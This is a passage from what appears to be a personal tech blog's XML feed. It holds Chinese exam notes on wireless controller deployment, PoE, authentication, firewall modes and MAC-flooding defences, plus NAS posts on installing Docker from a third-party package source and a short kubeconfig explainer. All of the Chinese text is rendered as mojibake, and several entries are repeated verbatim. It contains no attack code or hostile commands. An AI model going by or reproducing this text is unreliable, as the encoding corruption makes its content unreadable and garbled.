PPPOE<br>å•†è¶…ã€è½¦ç«™ç­‰å…¬å…±åœºæ‰€ä¸€èˆ¬é‡‡ç”¨ Web&#x2F;portal æˆ–çŸ­ä¿¡è®¤è¯ã€‚</p><h3 id="é—®é¢˜4"><a href="#é—®é¢˜4" class="headerlink" title="é—®é¢˜4"></a>é—®é¢˜4</h3><p>POE æœ‰ä¸¤ç§æ–¹å¼ï¼š<br>ç¬¬ä¸€ç§ï¼š8 æ ¹é“œèŠ¯æ—¢ä¼ æ•°æ®ï¼ŒåŒæ—¶è¿›è¡Œä¾›ç”µï¼Œä¸¤è€…ä½¿ç”¨ä¸åŒé¢‘ç‡ï¼›<br>ç¬¬äºŒç§ï¼šä½¿ç”¨ 1236 è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œ4578 è¿›è¡Œä¾›ç”µï¼Œå…¶ä¸­ 45 ä½æ­£æï¼Œ78 ä¸ºè´Ÿæã€‚</p><h2 id="2021å¹´11æœˆä¸‹åˆé¢˜-20230523-äºŒ"><a href="#2021å¹´11æœˆä¸‹åˆé¢˜-20230523-äºŒ" class="headerlink" title="2021å¹´11æœˆä¸‹åˆé¢˜   20230523(äºŒ)"></a>2021å¹´11æœˆä¸‹åˆé¢˜   20230523(äºŒ)</h2><h3 id="é—®é¢˜1-2"><a href="#é—®é¢˜1-2" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h3><h4 id="1-ACéƒ¨ç½²æ–¹å¼-ä¼˜ç¼ºç‚¹"><a href="#1-ACéƒ¨ç½²æ–¹å¼-ä¼˜ç¼ºç‚¹" class="headerlink" title="1 ACéƒ¨ç½²æ–¹å¼ ä¼˜ç¼ºç‚¹"></a>1 ACéƒ¨ç½²æ–¹å¼ ä¼˜ç¼ºç‚¹</h4><p>ç›¸è¾ƒäºä»¥æ—è·¯æ–¹å¼éƒ¨ç½²ï¼Œå°†ACç›´è¿éƒ¨ç½²å­˜åœ¨çš„é—®é¢˜æ˜¯ï¼š<br>ç­”æ¡ˆ1 summerï¼šè®¾å¤‡æ•…éšœä¼šå½±å“ç½‘ç»œè¿é€š<br>ç­”æ¡ˆ2ï¼šå­˜åœ¨å•ç‚¹æ•…éšœã€æ€§èƒ½ç“¶é¢ˆ<br>(è€å¸ˆ)æ—è·¯éƒ¨ç½²ï¼Œå¦‚æœå‰æœŸé…ç½®å¥½ï¼Œåé¢ACæŒ‚äº†ï¼Œæ˜¯ä¸ä¼šå½±å“ç½‘ç»œçš„</p><p>ç›´è¿éƒ¨ç½²çš„ç½‘ç»œè®¾ å¤‡é€šå¸¸ä¼šåœ¨ç½‘ç»œçš„ä¸»å¹²çº¿è·¯ä¸Šï¼Œè¿™ç§éƒ¨ç½²æ–¹å¼å­˜åœ¨å•ç‚¹æ•…éšœçš„é—®é¢˜ï¼ŒåŒæ—¶ä¹Ÿå¯ èƒ½å› ä¸ºè®¾å¤‡æœ¬èº«çš„æ€§èƒ½è¾¾ä¸åˆ°ç½‘ç»œä¼ è¾“çš„è¦æ±‚ï¼Œå‡ºç°æ€§èƒ½ç“¶é¢ˆã€‚æ‰€ä»¥ç›¸å½“ä¸€éƒ¨ åˆ†æ”¯æŒç›´è¿éƒ¨ç½²çš„è®¾å¤‡éƒ½æœ‰è®¾å¤‡æ•…éšœæ—¶ï¼Œç½‘ç»œæ•°æ®èƒ½ç›´é€šçš„åŠŸèƒ½ã€‚ </p><p>ç›¸è¾ƒäºéƒ¨ç½²åœ¨æ ¸å¿ƒå±‚ï¼Œå°†ACéƒ¨ç½²åœ¨æ¥å…¥å±‚å­˜åœ¨çš„é—®é¢˜æ˜¯ï¼š<br>ç­”æ¡ˆ1 summerï¼šå­˜åœ¨æ€§èƒ½ç“¶é¢ˆ<br>ç­”æ¡ˆ2 è½¯è€ƒçœŸé¢˜ï¼šä¸èƒ½å¾ˆå¥½çš„åˆ©ç”¨ AC çš„ NAT ã€ HDCP åŠŸèƒ½ã€‚æ€§èƒ½å·®ï¼Œç¨³å®šæ€§ä¸å¥½ï¼Œå…¶ä»–åŒºåŸŸçš„å·¥ä½œç«™è®¿é—®è·ç¦»è¿œï¼Œæ•ˆç‡ä½<br>(è€å¸ˆ)ä¸€èˆ¬æ ¸å¿ƒäº¤æ¢æœºæœ‰ä¸‡å…†æ¥å£ï¼Œä¸”æ€§èƒ½æ¯”æ¥å…¥äº¤æ¢æœºå¥½å¾ˆå¤š</p><p>å¦‚æœå°† AC éƒ¨ç½²åœ¨æ¥å…¥å±‚è®¾å¤‡ä¸Šï¼Œå¾€å¾€ç”±äºæ¥å…¥å±‚è®¾å¤‡æ€§èƒ½è¾ƒå·®ï¼Œç¨³å®šæ€§ä¸ å¥½ï¼Œä¹Ÿä¸ä¼šé…ç½®å†—ä½™çš„ç”µæºã€çº¿è·¯ç­‰æå‡å¯é æ€§çš„æ¡ä»¶ã€‚å°† AC éƒ¨ç½²åœ¨è¿™ç§è®¾å¤‡ ä¸Šï¼Œå¯èƒ½ä¼šå› ä¸ºæ¥å…¥å±‚è®¾å¤‡æœ¬èº«çš„ä¸å¯é ï¼Œå¯¼è‡´æ— çº¿ç½‘ç»œç˜«ç—ªã€‚å¦å¤–ï¼Œå°† AC æ¥ åœ¨æ¥å…¥å±‚è®¾å¤‡ä¸Šï¼Œä¹Ÿä¸èƒ½å¾ˆå¥½çš„åˆ©ç”¨ AC æœ¬èº«çš„ NAT å’Œå…¶ä»–ä¸€äº›åŠŸèƒ½ã€‚å¹¶ä¸”ï¼Œå…¶ ä»–åŒºåŸŸçš„æ¥å…¥å±‚å·¥ä½œç«™éœ€è¦é€šè¿‡æ ¸å¿ƒï¼Œå†è¿æ¥åˆ°æ¥å…¥å±‚ï¼Œå†åˆ° AC ï¼Œè®¿é—®çš„è·¯å¾„ æ¯”è¾ƒè¿œï¼Œæ•ˆç‡è¾ƒä½ã€‚</p><h4 id="2-è®¤è¯"><a href="#2-è®¤è¯" class="headerlink" title="2 è®¤è¯"></a>2 è®¤è¯</h4><p>PPPoEè®¤è¯    ADSL å…‰çº¤<br>Portal            Web<br>IEEE 802.1x ä¼ä¸šçº§ï¼Œéœ€è¦å®‰è£…å®¢æˆ·ç«¯ï¼Œå®‰å…¨æ€§è¾ƒé«˜</p><p>â€œä½¿ç”¨ web é¡µé¢è¿›è¡Œè®¤è¯åä¸Šç½‘â€å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ ç§åŸºäº webportal çš„è®¤è¯æ–¹å¼ï¼Œè¿™ç§æ–¹å¼æœ€å¤§çš„ç‰¹ç‚¹æ˜¯ä¸éœ€è¦å®‰è£…å®¢æˆ·ç«¯ï¼Œç›´ æ¥ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç½‘ç»œä¹‹å‰ï¼Œä¼šå¼ºåˆ¶å®šä½åˆ° web è®¤è¯é¡µé¢ã€‚</p><h4 id="3-ä¾›ç”µ"><a href="#3-ä¾›ç”µ" class="headerlink" title="3 ä¾›ç”µ"></a>3 ä¾›ç”µ</h4><p>åœ¨ç½‘ç»œè§„åˆ’ä¸­ï¼Œå¯¹APä¾›ç”µæ–¹å¼å¯ä»¥é‡‡ç”¨POEä¾›ç”µæˆ–DCç”µæºé€‚é…å™¨ä¾›ç”µ</p><h3 id="é—®é¢˜2-2"><a href="#é—®é¢˜2-2" class="headerlink" title="é—®é¢˜2"></a>é—®é¢˜2</h3><p>é˜²ç«å¢™çš„å·¥ä½œæ¨¡å¼ï¼š<br>é€æ˜æ¨¡å¼ï¼šäºŒå±‚ ä¸ç”¨é…IPåœ°å€<br>è·¯ç”±æ¨¡å¼ï¼šæ¥å£é…ipåœ°å€<br>æ··åˆæ¨¡å¼ï¼šæœ‰äº›æ¥å£é…ipåœ°å€ï¼Œæœ‰äº›æ¥å£ä¸é…</p><h3 id="é—®é¢˜4-1"><a href="#é—®é¢˜4-1" class="headerlink" title="é—®é¢˜4"></a>é—®é¢˜4</h3><p>æ–°åŠ å…¥ç½‘ç»œçš„ä¸»æœºéœ€è¦é€šè¿‡ DHCP æ–¹å¼è·å– IP åœ°å€ï¼Œä½†æ˜¯ï¼Œåœ¨ç”³è¯·åˆ°åˆæ³•çš„ IP åœ°å€å‰ï¼Œä¸»æœºåªèƒ½é‡‡ç”¨æº IP åœ°å€ 0.0.0.0 è¿›è¡Œä¸´æ—¶é€šä¿¡ã€‚</p><p>è¯¥ä¸»æœºå‘é€çš„ DHCP æŠ¥æ–‡æ— æ³•é€šè¿‡åŸºäºå­ç½‘åˆ’åˆ† VLAN çš„æ–¹å¼åŠ å…¥ä»»ä½• VLAN ï¼Œæœ€ç»ˆè®¾å¤‡ä¼šç»™è¯¥æŠ¥æ–‡ä¼šæ‰“ä¸Šæ¥å£çš„ç¼ºçœ VLAN ID(ç¼ºçœæƒ…å†µä¸‹ï¼Œæ¥å£çš„ç¼ºçœ VLAN ID ä¸º 1)ã€‚</p><h2 id="2022å¹´5æœˆä¸‹åˆé¢˜-20230525-å››"><a href="#2022å¹´5æœˆä¸‹åˆé¢˜-20230525-å››" class="headerlink" title="2022å¹´5æœˆä¸‹åˆé¢˜   20230525(å››)"></a>2022å¹´5æœˆä¸‹åˆé¢˜   20230525(å››)</h2><h3 id="BGP"><a href="#BGP" class="headerlink" title="BGP"></a>BGP</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230526003656.png" alt="image.png"></p><h3 id="rip-ospf"><a href="#rip-ospf" class="headerlink" title="rip ospf"></a>rip ospf</h3><p>ä»ç®—æ³•åŸç†ã€é€‚ç”¨èŒƒå›´ã€åŠŸèƒ½ç‰¹æ€§ä¸‰ä¸ªæ–¹é¢ç®€è¿° RIP å’Œ OSPF çš„åŒºåˆ«ã€‚<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230526010359.png" alt="image.png"></p><h2 id="â€”â€”â€”-è¯¾ä»¶ç›¸å…³æ¡ˆä¾‹é¢˜-â€”â€”â€”"><a href="#â€”â€”â€”-è¯¾ä»¶ç›¸å…³æ¡ˆä¾‹é¢˜-â€”â€”â€”" class="headerlink" title="â€”â€”â€”- è¯¾ä»¶ç›¸å…³æ¡ˆä¾‹é¢˜ â€”â€”â€”-"></a>â€”â€”â€”- è¯¾ä»¶ç›¸å…³æ¡ˆä¾‹é¢˜ â€”â€”â€”-</h2><h2 id="å¸¸ç”¨çš„DDosæ”»å‡»é˜²èŒƒæ–¹æ³•"><a href="#å¸¸ç”¨çš„DDosæ”»å‡»é˜²èŒƒæ–¹æ³•" class="headerlink" title="å¸¸ç”¨çš„DDosæ”»å‡»é˜²èŒƒæ–¹æ³•"></a>å¸¸ç”¨çš„DDosæ”»å‡»é˜²èŒƒæ–¹æ³•</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230524082336.png" alt="image.png"></p><h2 id="MAC-floodingè§£å†³æ–¹æ¡ˆ"><a href="#MAC-floodingè§£å†³æ–¹æ¡ˆ" class="headerlink" title="MAC-floodingè§£å†³æ–¹æ¡ˆ"></a>MAC-floodingè§£å†³æ–¹æ¡ˆ</h2><p>æ¥å£å’ŒMACé™æ€ç»‘å®š<br>é™åˆ¶æ¥å£MACåœ°å€å­¦ä¹ æ•°é‡</p><h3 id="å†—ä½™"><a href="#å†—ä½™" class="headerlink" title="å†—ä½™"></a>å†—ä½™</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230525220504.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘docker</title>
    <link href="/2023/05/12/nas/%E3%80%90nas%E3%80%91docker/"/>
    <url>/2023/05/12/nas/%E3%80%90nas%E3%80%91docker/</url>
    
    <content type="html"><![CDATA[<h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>å¥—ä»¶ä¸­å¿ƒä¸­æ²¡æœ‰dockerï¼Œæƒ³è¦å®‰è£…ä¸€ä¸ªdocker</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512220109.png" alt="image.png"></p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513000221.png" alt="image.png"></p><h2 id="æ·»åŠ ç¬¬ä¸‰æ–¹æº"><a href="#æ·»åŠ ç¬¬ä¸‰æ–¹æº" class="headerlink" title="æ·»åŠ ç¬¬ä¸‰æ–¹æº"></a>æ·»åŠ ç¬¬ä¸‰æ–¹æº</h2><p>ä¿®æ”¹é…ç½®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512233229.png" alt="image.png"></p><p>å¥—ä»¶ä¸­å¿ƒâ€”è®¾ç½®â€”å¥—ä»¶æ¥æºâ€”æ–°å¢ï¼šåç§°éšä¾¿å–ï¼Œä½ç½®æŠŠç½‘å€å¤åˆ¶è¿›å»ç¡®è®¤å³å¯</p><p>DSM6.xçŸ¿ç¥SPKå¥—ä»¶æºï¼š<a href="https://imnks.com/go/aHR0cHM6Ly9zcGsuaW1ua3MuY29tLw">https://spk.imnks.com/</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235104.png" alt="image.png"></p><p>æ·»åŠ ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°å·¦ä¾§å¤šäº†ä¸€ä¸ªç¤¾ç¾¤ï¼Œç„¶ååœ¨å¥—ä»¶ä¸­å¿ƒçš„ç¤¾ç¾¤æœç´¢å³å¯ã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235200.png" alt="image.png"></p><p>ç‚¹å‡»â€œç¤¾ç¾¤â€ï¼Œå¦‚æœå³ä¾§æ²¡æœ‰ä¸œè¥¿çš„è¯ï¼Œå¯ä»¥ç‚¹å‡»ä¸€ä¸‹â€œåˆ·æ–°â€</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235234.png" alt="image.png"></p><p>æœç´¢â€œdockerâ€ï¼Œç›´æ¥å®‰è£…</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235427.png" alt="image.png"></p><p>å®‰è£…ä¸ä¸Šdockerï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿæ˜¾ç¤ºä¸‹è½½dockerå¤±è´¥</p><p>æ‰¾<br>æ‰¾<br>æ‰¾</p><h3 id="å°è¯•1ï¼šå®‰è£…çŒ«ç›˜ä¸‰åˆä¸€ä¿®å¤"><a href="#å°è¯•1ï¼šå®‰è£…çŒ«ç›˜ä¸‰åˆä¸€ä¿®å¤" class="headerlink" title="å°è¯•1ï¼šå®‰è£…çŒ«ç›˜ä¸‰åˆä¸€ä¿®å¤"></a>å°è¯•1ï¼šå®‰è£…çŒ«ç›˜ä¸‰åˆä¸€ä¿®å¤</h3><p>å®‰è£…å®Œç³»ç»Ÿä¹‹åï¼Œå‘ç°æŒ‡ç¤ºç¯ä¸äº®</p><p>ä¸çŸ¥é“æ˜¯å¦è·Ÿè¿™ä¸ªæœ‰å…³ï¼Œå®‰è£…ä¸‹é¢å¥—ä»¶</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513001425.png" alt="image.png"></p><p>å®‰è£…å®Œä¹‹åï¼Œå°±å¯ä»¥çœ‹åˆ°çŒ«ç›˜çš„æŒ‡ç¤ºç¯äº®äº†</p><p>ä½†æ˜¯dockerè¿˜æ˜¯æ˜¾ç¤ºä¸‹è½½å¤±è´¥</p><h3 id="å°è¯•2ï¼šåˆ‡æ¢ç”¨æˆ·"><a href="#å°è¯•2ï¼šåˆ‡æ¢ç”¨æˆ·" class="headerlink" title="å°è¯•2ï¼šåˆ‡æ¢ç”¨æˆ·"></a>å°è¯•2ï¼šåˆ‡æ¢ç”¨æˆ·</h3><p>åˆšå¼€å§‹æ˜¯ç”¨ä¸€ä¸ªè‡ªå®šä¹‰ç”¨æˆ·ç™»å½•çš„ç³»ç»Ÿ<br>åˆ‡æ¢åˆ°adminç”¨æˆ·ä¸‹å®‰è£…</p><p>å®‰è£…dockerè¿˜æ˜¯æ˜¾ç¤ºä¸‹è½½å¤±è´¥</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://post.smzdm.com/p/akmv452r/"># NAS ç¯‡ä¸€ï¼šç¾¤æ™–DSM7.0 å®‰è£…docker</a><br><a href="https://imnks.com/1780.html"># çŸ¿ç¥ç¾¤æ™–SPKå¥—ä»¶ä¸­å¿ƒ ä¸Šçº¿å•¦ï¼æ”¯æŒDSM6ã€DSM7</a></p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘docker</title>
    <link href="/2023/05/12/nas/unsupported/%E3%80%90nas%E3%80%91docker/"/>
    <url>/2023/05/12/nas/unsupported/%E3%80%90nas%E3%80%91docker/</url>
    
    <content type="html"><![CDATA[<h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>å¥—ä»¶ä¸­å¿ƒä¸­æ²¡æœ‰dockerï¼Œæƒ³è¦å®‰è£…ä¸€ä¸ªdocker</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512220109.png" alt="image.png"></p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513000221.png" alt="image.png"></p><h2 id="æ·»åŠ ç¬¬ä¸‰æ–¹æº"><a href="#æ·»åŠ ç¬¬ä¸‰æ–¹æº" class="headerlink" title="æ·»åŠ ç¬¬ä¸‰æ–¹æº"></a>æ·»åŠ ç¬¬ä¸‰æ–¹æº</h2><p>ä¿®æ”¹é…ç½®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512233229.png" alt="image.png"></p><p>å¥—ä»¶ä¸­å¿ƒâ€”è®¾ç½®â€”å¥—ä»¶æ¥æºâ€”æ–°å¢ï¼šåç§°éšä¾¿å–ï¼Œä½ç½®æŠŠç½‘å€å¤åˆ¶è¿›å»ç¡®è®¤å³å¯</p><p>DSM6.xçŸ¿ç¥SPKå¥—ä»¶æºï¼š<a href="https://imnks.com/go/aHR0cHM6Ly9zcGsuaW1ua3MuY29tLw">https://spk.imnks.com/</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235104.png" alt="image.png"></p><p>æ·»åŠ ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°å·¦ä¾§å¤šäº†ä¸€ä¸ªç¤¾ç¾¤ï¼Œç„¶ååœ¨å¥—ä»¶ä¸­å¿ƒçš„ç¤¾ç¾¤æœç´¢å³å¯ã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235200.png" alt="image.png"></p><p>ç‚¹å‡»â€œç¤¾ç¾¤â€ï¼Œå¦‚æœå³ä¾§æ²¡æœ‰ä¸œè¥¿çš„è¯ï¼Œå¯ä»¥ç‚¹å‡»ä¸€ä¸‹â€œåˆ·æ–°â€</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235234.png" alt="image.png"></p><p>æœç´¢â€œdockerâ€ï¼Œç›´æ¥å®‰è£…</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512235427.png" alt="image.png"></p><p>å®‰è£…ä¸ä¸Šdockerï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿæ˜¾ç¤ºä¸‹è½½dockerå¤±è´¥</p><p>æ‰¾<br>æ‰¾<br>æ‰¾</p><h3 id="å°è¯•1ï¼šå®‰è£…çŒ«ç›˜ä¸‰åˆä¸€ä¿®å¤"><a href="#å°è¯•1ï¼šå®‰è£…çŒ«ç›˜ä¸‰åˆä¸€ä¿®å¤" class="headerlink" title="å°è¯•1ï¼šå®‰è£…çŒ«ç›˜ä¸‰åˆä¸€ä¿®å¤"></a>å°è¯•1ï¼šå®‰è£…çŒ«ç›˜ä¸‰åˆä¸€ä¿®å¤</h3><p>å®‰è£…å®Œç³»ç»Ÿä¹‹åï¼Œå‘ç°æŒ‡ç¤ºç¯ä¸äº®</p><p>ä¸çŸ¥é“æ˜¯å¦è·Ÿè¿™ä¸ªæœ‰å…³ï¼Œå®‰è£…ä¸‹é¢å¥—ä»¶</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230513001425.png" alt="image.png"></p><p>å®‰è£…å®Œä¹‹åï¼Œå°±å¯ä»¥çœ‹åˆ°çŒ«ç›˜çš„æŒ‡ç¤ºç¯äº®äº†</p><p>ä½†æ˜¯dockerè¿˜æ˜¯æ˜¾ç¤ºä¸‹è½½å¤±è´¥</p><h3 id="å°è¯•2ï¼šåˆ‡æ¢ç”¨æˆ·"><a href="#å°è¯•2ï¼šåˆ‡æ¢ç”¨æˆ·" class="headerlink" title="å°è¯•2ï¼šåˆ‡æ¢ç”¨æˆ·"></a>å°è¯•2ï¼šåˆ‡æ¢ç”¨æˆ·</h3><p>åˆšå¼€å§‹æ˜¯ç”¨ä¸€ä¸ªè‡ªå®šä¹‰ç”¨æˆ·ç™»å½•çš„ç³»ç»Ÿ<br>åˆ‡æ¢åˆ°adminç”¨æˆ·ä¸‹å®‰è£…</p><p>å®‰è£…dockerè¿˜æ˜¯æ˜¾ç¤ºä¸‹è½½å¤±è´¥</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://post.smzdm.com/p/akmv452r/"># NAS ç¯‡ä¸€ï¼šç¾¤æ™–DSM7.0 å®‰è£…docker</a><br><a href="https://imnks.com/1780.html"># çŸ¿ç¥ç¾¤æ™–SPKå¥—ä»¶ä¸­å¿ƒ ä¸Šçº¿å•¦ï¼æ”¯æŒDSM6ã€DSM7</a></p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘dockerå®‰è£…qBittorrent</title>
    <link href="/2023/05/12/nas/%E3%80%90nas%E3%80%91docker%E5%AE%89%E8%A3%85qBittorrent/"/>
    <url>/2023/05/12/nas/%E3%80%90nas%E3%80%91docker%E5%AE%89%E8%A3%85qBittorrent/</url>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸‰æ–¹ä¸‹è½½å·¥å…·ï¼Œé…ç½®éº»çƒ¦</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘dockerå®‰è£…qBittorrent</title>
    <link href="/2023/05/12/nas/unsupported/%E3%80%90nas%E3%80%91docker%E5%AE%89%E8%A3%85qBittorrent/"/>
    <url>/2023/05/12/nas/unsupported/%E3%80%90nas%E3%80%91docker%E5%AE%89%E8%A3%85qBittorrent/</url>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸‰æ–¹ä¸‹è½½å·¥å…·ï¼Œé…ç½®éº»çƒ¦</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘moments</title>
    <link href="/2023/05/12/nas/%E3%80%90nas%E3%80%91moments/"/>
    <url>/2023/05/12/nas/%E3%80%90nas%E3%80%91moments/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213150.png" alt="image.png"></p><p>åˆ°â€œå·²å®‰è£…â€ï¼Œç‚¹å‡»â€œæ‰“å¼€â€</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213239.png" alt="image.png"></p><p>ä¼šè·³è½¬åˆ°ä¸€ä¸ªæ–°çš„ç•Œé¢ï¼Œæ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213312.png" alt="image.png"></p><p>å›åˆ°nasé¦–é¡µï¼Œç‚¹å‡»â€œæ§åˆ¶é¢æ¿â€ â€œç”¨æˆ·è´¦å·â€</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213435.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213708.png" alt="image.png"></p><p>å›åˆ°momentsç•Œé¢ï¼Œé‡æ–°åˆ·æ–°ï¼Œå°±å¯ä»¥è¿›æ¥å•¦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230512213834.png" alt="image.png"></p><p>ç„¶åå°±å¯ä»¥åˆ›å»ºæ–‡ä»¶å¤¹ï¼Œä¸Šä¼ ç…§ç‰‡å•¦~</p>]]></content>
    
    
    <categories>
      
      <category>nas</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘todo(202305) kubeconfigæ–‡ä»¶</title>
    <link href="/2023/05/12/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91todo(202305)%20kubeconfig%E6%96%87%E4%BB%B6/"/>
    <url>/2023/05/12/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91todo(202305)%20kubeconfig%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>åœ¨Kubernetesä¸­ï¼Œkubeconfigæ˜¯ç”¨äºæŒ‡å®šå¦‚ä½•è¿æ¥åˆ°Kubernetesé›†ç¾¤çš„é…ç½®æ–‡ä»¶ã€‚kubeconfigåŒ…å«äº†ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ol><li>Kubernetes APIæœåŠ¡å™¨çš„åœ°å€å’Œè®¿é—®å‡­æ®ï¼ˆç”¨æˆ·åå’Œå¯†ç ã€å®¢æˆ·ç«¯è¯ä¹¦å’Œç§é’¥ç­‰ï¼‰ã€‚</li><li>ç”¨äºæˆæƒè®¿é—®Kubernetes APIçš„å‡­æ®ï¼ˆä¾‹å¦‚ï¼ŒTokenã€BasicAuthç­‰ï¼‰ã€‚</li><li>Kubernetesé›†ç¾¤çš„CAï¼ˆè¯ä¹¦é¢å‘æœºæ„ï¼‰è¯ä¹¦ï¼Œç”¨äºéªŒè¯APIæœåŠ¡å™¨çš„TLSè¯ä¹¦ã€‚</li></ol><p>kubeconfigä¸­çš„è¯ä¹¦åŒ…æ‹¬å®¢æˆ·ç«¯è¯ä¹¦å’ŒCAè¯ä¹¦ã€‚å®¢æˆ·ç«¯è¯ä¹¦ç”¨äºå¯¹ä¸Kubernetes APIæœåŠ¡å™¨çš„é€šä¿¡è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå®ƒé€šå¸¸ç”±CAè¯ä¹¦ç­¾å‘ã€‚CAè¯ä¹¦ç”¨äºéªŒè¯Kubernetes APIæœåŠ¡å™¨çš„TLSè¯ä¹¦ï¼Œä»¥ç¡®ä¿ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡æ˜¯å®‰å…¨çš„ã€‚åœ¨kubeconfigä¸­é…ç½®æ­£ç¡®çš„å®¢æˆ·ç«¯è¯ä¹¦å’ŒCAè¯ä¹¦å¯ä»¥ç¡®ä¿ä¸Kubernetes APIæœåŠ¡å™¨çš„è¿æ¥æ˜¯å®‰å…¨çš„ï¼Œå¹¶ä¸”åªæœ‰æˆæƒç”¨æˆ·æ‰èƒ½è®¿é—®é›†ç¾¤èµ„æºã€‚</p><p>Kubernetesä½¿ç”¨TLSæ¥ä¿æŠ¤APIæœåŠ¡å™¨å’Œå„ä¸ªç»„ä»¶ä¹‹é—´çš„é€šä¿¡ã€‚å®¢æˆ·ç«¯è¯ä¹¦å’ŒCAè¯ä¹¦éƒ½æ˜¯X.509æ ¼å¼çš„æ•°å­—è¯ä¹¦ï¼Œç”¨äºéªŒè¯å’ŒåŠ å¯†è¿™äº›é€šä¿¡ã€‚å› æ­¤ï¼Œåœ¨kubeconfigä¸­æ­£ç¡®é…ç½®è¿™äº›è¯ä¹¦æ˜¯ç¡®ä¿Kubernetesé›†ç¾¤å®‰å…¨æ€§çš„å…³é”®ä¹‹ä¸€ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘pingå¸¸ç”¨å‘½ä»¤</title>
    <link href="/2023/05/11/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91ping%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/05/11/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91ping%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
